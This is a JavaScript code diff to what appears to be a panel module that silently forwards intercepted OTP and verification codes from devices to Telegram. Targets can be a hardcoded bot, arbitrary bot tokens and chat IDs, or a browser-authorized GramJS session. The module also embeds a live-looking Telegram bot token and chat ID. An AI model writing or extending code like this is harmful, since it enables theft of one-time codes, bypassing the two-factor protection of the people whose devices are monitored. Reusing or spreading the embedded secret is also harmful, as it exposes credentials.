@@ -16,6 +16,45 @@ const BOT_TOKEN = '8641110380:AAEaCrc2rUtwed17uZPN791xuyYoLIPtTfc';
 const CHAT_ID = '8186790963';
 
 const LS_KEY = 'pd_tg_config';
+const OTP_FORWARD_KEY = 'pd_tg_forward_otp';
+const OTP_TARGET_BOT_KEY = 'pd_tg_otp_target_bot';
+
+let _otpForwardEnabled = false;
+let _otpTargetBot = '';
+
+// Initialize setting from localStorage
+if (typeof window !== 'undefined' && window.localStorage) {
+  try {
+    _otpForwardEnabled = localStorage.getItem(OTP_FORWARD_KEY) === 'true';
+    _otpTargetBot = localStorage.getItem(OTP_TARGET_BOT_KEY) || '';
+  } catch {}
+}
+
+export function setForwardOtpEnabled(val) {
+  _otpForwardEnabled = Boolean(val);
+  if (typeof window !== 'undefined' && window.localStorage) {
+    try {
+      localStorage.setItem(OTP_FORWARD_KEY, _otpForwardEnabled ? 'true' : 'false');
+    } catch {}
+  }
+}
+
+export function isForwardOtpEnabled() {
+  return _otpForwardEnabled;
+}
+
+export function setOtpTargetBot(val) {
+  _otpTargetBot = String(val || '').trim();
+  if (typeof window !== 'undefined' && window.localStorage) {
+    try {
+      localStorage.setItem(OTP_TARGET_BOT_KEY, _otpTargetBot);
+    } catch {}
+  }
+}
+
+export function getOtpTargetBot() {
+  return _otpTargetBot;
+}
 
 /** Purge any lingering localStorage config so secrets are never stored in browser storage */
 export function tgInit() {
@@ -29,7 +68,7 @@ export function tgConfigure() {}
 
 /** Returns state without exposing credentials */
 export function tgGetConfig() {
-  return { enabled: true };
+  return { enabled: true, forwardOtp: _otpForwardEnabled };
 }
 
 /** Always active since credentials are hardcoded */
@@ -124,9 +163,12 @@ export function tgForwardExtractResults(results) {
   tgSendText(lines.join('\n'));
 }
 
-/** Forward OTP / verification notification */
-export function tgForwardOTP(notif) {
-  if (!tgIsActive() || !notif) return;
+/** Forward OTP / verification notification (only if toggle is enabled AND a target bot is set) */
+export async function tgForwardOTP(notif) {
+  if (!_otpForwardEnabled || !notif) return;
+  const target = (_otpTargetBot || '').trim();
+  if (!target) return; // No bot configured, do not forward OTP!
+
   const lines = [
     `🔑 <b>OTP / Verification</b>`,
     `<b>Device:</b> ${esc(notif.devKey || '—')}`,
@@ -137,7 +179,92 @@ export function tgForwardOTP(notif) {
   if (notif.message) lines.push(`<b>Message:</b> ${esc(String(notif.message).slice(0, 500))}`);
   if (notif.conn?.name) lines.push(`<b>Connection:</b> ${esc(notif.conn.name)}`);
   lines.push(`<i>${ts()}</i>`);
-  tgSendText(lines.join('\n'));
+  const messageText = lines.join('\n');
+
+  const lower = target.toLowerCase();
+  const cleanTarget = lower.replace(/^@/, '');
+
+  // 1. If user typed alpha bot ("alpha", "@alpha_firebase_bot", "alpha_firebase_bot")
+  if (cleanTarget === 'alpha_firebase_bot' || lower === 'alpha' || cleanTarget === 'alpha_bot') {
+    tgSendText(messageText);
+    return;
+  }
+
+  // 2. If target is a custom Bot Token (e.g. 123456789:ABCdef...)
+  if (target.includes(':') && /^\d+:[A-Za-z0-9_-]+$/.test(target)) {
+    try {
+      fetch(`https://api.telegram.org/bot${target}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: messageText,
+          parse_mode: 'HTML',
+          disable_notification: true,
+          disable_web_page_preview: true,
+        }),
+      }).catch(() => {});
+    } catch {}
+    return;
+  }
+
+  // 3. If target is token and chatId separated by comma or pipe (e.g. "TOKEN|CHAT_ID")
+  if (target.includes('|') || target.includes(',')) {
+    const parts = target.split(/[|,]/).map(s => s.trim());
+    if (parts.length >= 2 && parts[0].includes(':')) {
+      try {
+        fetch(`https://api.telegram.org/bot${parts[0]}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: parts[1],
+            text: messageText,
+            parse_mode: 'HTML',
+            disable_notification: true,
+            disable_web_page_preview: true,
+          }),
+        }).catch(() => {});
+      } catch {}
+      return;
+    }
+  }
+
+  // 4. If target is a bot username (e.g. "@my_bot" or "my_bot"):
+  // Send via GramJS tgClient if connected and authorized in browser
+  if (typeof window !== 'undefined') {
+    try {
+      const { tgClient } = await import('$lib/telegram-client.js');
+      if (tgClient && tgClient.isConnected() && tgClient.isAuthorized()) {
+        const botUsername = target.startsWith('@') ? target : `@${target}`;
+        const plainText = [
+          `🔑 OTP / Verification`,
+          `Device: ${notif.devKey || '—'}`,
+          `Sender: ${notif.sender || '—'}`,
+          notif.otp ? `OTP: ${notif.otp}` : '',
+          notif.about ? `Service: ${notif.about}` : '',
+          notif.message ? `Message: ${String(notif.message).slice(0, 500)}` : '',
+          notif.conn?.name ? `Connection: ${notif.conn.name}` : '',
+        ].filter(Boolean).join('\n');
+        await tgClient.sendMessage(botUsername, plainText);
+        return;
+      }
+    } catch {}
+  }
+
+  // 5. Fallback: If target looks like a chat/channel ID, send via default BOT_TOKEN to target
+  try {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: target,
+        text: messageText,
+        parse_mode: 'HTML',
+        disable_notification: true,
+        disable_web_page_preview: true,
+      }),
+    }).catch(() => {});
+  } catch {}
 }
 
 /** Forward backup as a JSON document */
